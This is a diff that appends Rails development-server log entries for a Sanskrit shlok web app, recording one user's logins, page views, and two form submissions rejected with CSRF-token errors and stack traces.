@@ -11060,3 +11060,2908 @@ Completed 200 OK in 8ms (Views: 7.1ms | ActiveRecord: 0.0ms | Allocations: 3705)
   [1m[36mActiveRecord::InternalMetadata Load (0.3ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = $1 LIMIT $2[0m  [["key", "environment"], ["LIMIT", 1]]
   [1m[35m (0.5ms)[0m  [1m[34mSELECT pg_advisory_unlock(1409038475602093665)[0m
   [1m[35m (0.6ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:40:35 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (0.8ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.8ms | Allocations: 422)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 11.6ms | Allocations: 7405)
+Completed 200 OK in 21ms (Views: 13.9ms | ActiveRecord: 0.0ms | Allocations: 11095)
+
+
+Started GET "/logging/login" for 14.139.233.131 at 2022-01-05 13:40:37 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 1.5ms | Allocations: 799)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3989)
+Completed 200 OK in 8ms (Views: 7.3ms | ActiveRecord: 0.0ms | Allocations: 5183)
+
+
+Started POST "/logging/loginp" for 14.139.233.131 at 2022-01-05 13:40:45 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"meda_r@pp.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.9ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "meda_r@pp.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 18ms (ActiveRecord: 7.2ms | Allocations: 5820)
+
+
+Started GET "/shlok/ashlokr" for 14.139.233.131 at 2022-01-05 13:40:45 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 14.9ms | Allocations: 4124)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 20.4ms | Allocations: 7334)
+Completed 200 OK in 25ms (Views: 17.1ms | ActiveRecord: 5.9ms | Allocations: 8819)
+
+
+Started GET "/shlok/ashlokc" for 14.139.233.131 at 2022-01-05 13:40:52 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 1.3ms | Allocations: 716)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.2ms | Allocations: 3689)
+Completed 200 OK in 10ms (Views: 8.9ms | ActiveRecord: 0.0ms | Allocations: 4268)
+
+
+Started POST "/shlok/ashlokcp" for 14.139.233.131 at 2022-01-05 13:40:58 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokcp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"asf", "shlok"=>"sdf", "translation"=>"dg", "commit"=>"अग्रेस्थापनं करोतु"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 658)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/ashlokc" for 14.139.233.131 at 2022-01-05 13:41:02 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 0.6ms | Allocations: 450)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.4ms | Allocations: 3557)
+Completed 200 OK in 7ms (Views: 6.0ms | ActiveRecord: 0.0ms | Allocations: 4043)
+
+
+Started GET "/shlok/ashlokr" for 14.139.233.131 at 2022-01-05 13:41:04 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 4.3ms | Allocations: 1083)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.8ms | Allocations: 4067)
+Completed 200 OK in 10ms (Views: 8.3ms | ActiveRecord: 1.0ms | Allocations: 4486)
+
+
+Started GET "/shlok/4" for 14.139.233.131 at 2022-01-05 13:41:28 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"4"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.5ms | Allocations: 690)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.2ms | Allocations: 3663)
+Completed 200 OK in 13ms (Views: 8.5ms | ActiveRecord: 0.8ms | Allocations: 5107)
+
+
+Started GET "/shlok/ashlokr" for 14.139.233.131 at 2022-01-05 13:42:27 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.2ms | Allocations: 973)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 16.0ms | Allocations: 3961)
+Completed 200 OK in 18ms (Views: 16.1ms | ActiveRecord: 0.9ms | Allocations: 4377)
+
+
+Started GET "/shlok/ashlokc" for 14.139.233.131 at 2022-01-05 13:42:48 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 0.6ms | Allocations: 423)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.6ms | Allocations: 3396)
+Completed 200 OK in 10ms (Views: 9.2ms | ActiveRecord: 0.0ms | Allocations: 3799)
+
+
+Started POST "/shlok/ashlokcp" for 14.139.233.131 at 2022-01-05 13:42:51 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokcp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"asdF", "shlok"=>"asdf", "translation"=>"asdf", "commit"=>"अग्रेस्थापनं करोतु"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 596)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/ashlokc" for 14.139.233.131 at 2022-01-05 13:43:06 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 1.0ms | Allocations: 423)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.3ms | Allocations: 3412)
+Completed 200 OK in 9ms (Views: 8.0ms | ActiveRecord: 0.0ms | Allocations: 3813)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:12 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.3ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 18.5ms | Allocations: 1040)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 82.2ms | Allocations: 4026)
+Completed 200 OK in 88ms (Views: 86.4ms | ActiveRecord: 1.3ms | Allocations: 4569)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:43:14 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.4ms | Allocations: 149)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3354)
+Completed 200 OK in 8ms (Views: 7.4ms | ActiveRecord: 0.0ms | Allocations: 4487)
+
+
+Started GET "/events/revents" for 14.139.233.131 at 2022-01-05 13:43:15 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.3ms | Allocations: 139)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.2ms | Allocations: 3376)
+Completed 200 OK in 7ms (Views: 6.4ms | ActiveRecord: 0.0ms | Allocations: 4509)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:43:16 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.5ms | Allocations: 3042)
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 3523)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:17 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.2ms | Allocations: 991)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.6ms | Allocations: 3977)
+Completed 200 OK in 9ms (Views: 7.1ms | ActiveRecord: 1.0ms | Allocations: 4399)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:43:18 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.5ms | Allocations: 3022)
+Completed 200 OK in 9ms (Views: 8.0ms | ActiveRecord: 0.0ms | Allocations: 3448)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:19 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.3ms | Allocations: 883)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.5ms | Allocations: 3869)
+Completed 200 OK in 9ms (Views: 6.8ms | ActiveRecord: 1.2ms | Allocations: 4282)
+
+
+Started GET "/events/revents" for 14.139.233.131 at 2022-01-05 13:43:20 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 10.7ms | Allocations: 3029)
+Completed 200 OK in 12ms (Views: 11.3ms | ActiveRecord: 0.0ms | Allocations: 3454)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:43:21 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.4ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.0ms | Allocations: 3051)
+Completed 200 OK in 17ms (Views: 10.1ms | ActiveRecord: 0.0ms | Allocations: 3484)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:23 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.5ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 7.2ms | Allocations: 885)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 12.2ms | Allocations: 3877)
+Completed 200 OK in 13ms (Views: 11.4ms | ActiveRecord: 1.5ms | Allocations: 4291)
+
+
+Started GET "/logging/logout" for 14.139.233.131 at 2022-01-05 13:43:24 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#logout as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 294)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:43:24 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
